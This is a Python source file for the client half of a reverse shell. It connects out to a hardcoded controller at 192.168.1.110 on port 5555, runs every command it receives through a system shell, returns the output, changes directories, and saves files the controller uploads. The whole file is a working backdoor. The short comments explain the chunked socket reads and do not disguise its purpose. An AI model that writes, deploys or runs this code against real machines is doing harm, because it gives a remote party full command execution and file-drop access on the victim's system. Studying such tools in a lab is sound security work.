import socket
import json
import subprocess
import os

def send(data):
    jsonData = json.dumps(data)
    s.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv():
    data = ''

    while True:
        try:
            data = data + s.recv(1024).decode('latin-1').rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Download the file received from the server and store it into the file system
def downloadFileRecv(fileName):
    f = open(fileName, 'wb') # Open the file in reading bytes mode
    s.settimeout(1) # We must set the timeout in order for the client to have time to receive the data
    chunk = s.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = s.recv(1024)

        except socket.timeout as e:
            break

    s.settimeout(None)
    f.close()

def shell():
    while True:

        command = recv()

        if command == 'exit': # Exit the loop if the exit message is received 
            break

        elif command == 'help':
            pass

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ': # Change to the specified directory
            os.chdir(command[3:])

        elif command[:6] == 'upload':
            downloadFileRecv(command[7:])

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode('latin-1')
            send(result)

# Connection data
HOST = '192.168.1.110'
PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shell()